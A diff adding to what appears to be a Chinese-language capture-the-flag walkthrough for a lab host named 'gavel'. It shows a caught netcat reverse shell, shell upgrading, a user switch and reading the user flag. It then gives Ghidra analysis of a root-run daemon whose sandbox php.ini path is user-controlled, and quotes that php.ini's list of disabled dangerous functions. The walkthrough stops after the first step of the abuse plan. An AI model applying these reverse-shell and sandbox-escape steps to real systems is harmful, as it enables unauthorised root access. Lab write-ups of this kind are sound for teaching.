@@ -225,3 +225,142 @@ bash: cannot set terminal process group (1058): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@gavel:/var/www/html/gavel/includes$
 ```
+### 横向移动
+```
+[★]$ nc -lvnp 9000
+listening on [any] 9000 ...
+connect to [10.10.15.139] from (UNKNOWN) [10.129.242.203] 52228
+bash: cannot set terminal process group (1058): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@gavel:/var/www/html/gavel/includes$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<des$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@gavel:/var/www/html/gavel/includes$ ^Z
+[1]+  Stopped                 nc -lvnp 9000
+[★]$ stty raw -echo;fg
+nc -lvnp 9000
+             export TERM=xterm
+www-data@gavel:/var/www/html/gavel/includes$ cat /etc/passwd
+<SNIP>
+auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
+</SNIP>
+
+www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
+Password: 
+auctioneer@gavel:/var/www/html/gavel/includes$ whoami
+auctioneer
+auctioneer@gavel:/var/www/html/gavel/includes$
+auctioneer@gavel:/var/www/html/gavel/includes$ cat ../../../../../home/auctioneer/user.txt
+```
+### 特权提升
+#### 让我们查看一下这个组所拥有的文件
+```
+auctioneer@gavel:/var/www/html/gavel/includes$ id
+uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
+auctioneer@gavel:/var/www/html/gavel/includes$ find / -group gavel-seller 2>/dev/null
+/run/gaveld.sock
+/usr/local/bin/gavel-util
+```
+#### 我们看到有一个名为“gavel-util”的二进制文件，这个文件属于这个小组。此外，还有一个名为“gaveld.sock”的 Unix 域套接字文件。
+#### 在 /opt 目录中进行查看，我们发现有一个名为“gavel”的目录，其中包含以下文件。
+```
+auctioneer@gavel:/opt/gavel$ ls -la
+total 56
+drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
+-rwxr-xr-- 1 root root 35992 Oct  3  2025 gaveld
+-rw-r--r-- 1 root root   364 Sep 20  2025 sample.yaml
+drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
+```
+#### 我们注意到还有一个名为“gaveld”的二进制文件。
+#### 首先，让我们来看看“gavel-util”这个文件。
+```
+auctioneer@gavel:/$ cd ~
+auctioneer@gavel:~$ file /usr/local/bin/gavel-util
+/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped
+```
+#### 我们可以通过“文件”命令来确认这是一个 ELF 二进制文件。运行此命令后，会显示一个帮助菜单。
+```
+auctioneer@gavel:~$ /usr/local/bin/gavel-util
+Usage: /usr/local/bin/gavel-util <cmd> [options]
+Commands:
+  submit <file>           Submit new items (YAML format)
+  stats                   Show Auction stats
+  invoice                 Request invoice
+```
+#### 通过这个二进制文件，我们可以使用 YAML 文件获取拍卖统计数据、请求发票以及提交新的拍卖物品。
+#### 这只是客户端程序；实际的功能是由 gaveld 服务进程来处理的，该服务进程位于 /opt 目录下。查看运行此服务进程的进程，我们可以发现它是以 root 用户身份运行的。
+```
+auctioneer@gavel:~$ ps aux | grep gavel
+root        1000  0.0  0.0  19128  3848 ?        Ss   07:56   0:00 /opt/gavel/gaveld
+root        1011  0.4  0.4  26784 18488 ?        Ss   07:56   1:08 python3 /root/scripts/timeout_gavel.py
+auction+   45987  0.0  0.0   6968  2556 pts/1    S+   12:08   0:00 grep gavel
+
+auctioneer@gavel:/opt/gavel$ ls
+gaveld	sample.yaml  submission
+auctioneer@gavel:/opt/gavel$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+```
+[★]$ wget http://10.129.242.203:8011/gaveld
+```
+#### 让我们在 Ghidra 中打开它，来查看解码后的源代码。
+```
+[★]$ ghidra        //它是一个项目制工具（Project-based）
+
+创建 Project
+打开后：
+点击：
+File → New Project
+选择：        Non-Shared Project
+取名字，比如： gavel
+
+导入二进制文件
+点击：File → Import File
+然后选：/opt/gavel/gaveld
+
+双击 gaveld
+进入分析界面（CodeBrowser）
+一定要点：✔ Analyze（自动分析，非常关键）
+```
+#### 查看程序树，有一个名为“php_safe_run”的函数，看起来挺有意思的。
+#### Program Tree -> Symbol Tree -> Functions -> php_safe_run
+![图片](images/2026040405.png)
+#### 在这个功能中，我们可以看到它使用 PHP 在一个隔离环境中来评估规则表达式。最终的译文：这个位于 /opt/gavel/.config/php/ 目录下的 php.ini 文件被用作沙盒环境中 PHP 的配置文件。
+#### 查看该文件后，我们发现诸如 system() 和 exec() 这类危险函数已被禁用。
+```
+auctioneer@gavel:/$ cat /opt/gavel/.config/php/php.ini
+engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off
+```
+#### 因此，即便我们通过自定义的 YAML 文件提交了一条新规则，我们也无法利用该规则来使用这些函数来执行命令。
+#### 所以，我们需要加载我们自己的 php.ini 文件。但该如何操作呢？仔细观察就会发现，php.ini 文件的加载路径是从 RULE_PATH 变量中获取的。因此，我们可以将这个变量指向我们自己的 php.ini 文件。
+```
+  json_object_object_get_ex(param_1,&DAT_00105004,&local_3100);
+  if (((local_3100 == 0) || (iVar1 = json_object_is_type(local_3100,4), iVar1 == 0)) ||
+     (iVar1 = json_object_object_get_ex(local_3100,"RULE_PATH",local_30f8), iVar1 == 0)) {
+    strncpy(local_3048,"/opt/gavel/.config/php/php.ini",0x1000);
+    local_2049 = 0;
+  }
+
+如果 (没有 RULE_PATH)
+    用默认路径 /opt/gavel/.config/php/php.ini
+否则
+    用你提供的 RULE_PATH
+
+//默认路径被设置为：/opt/gavel/.config/php/php.ini
+//用户可以控制 RULE_PATH
+```
+#### 了解了这一切之后，滥用这种手段的步骤如下。
+#### 1. 复制原始的 php.ini 文件，并对其进行编辑，以使 system() 函数及其他危险函数能够正常使用。“允许；准许”
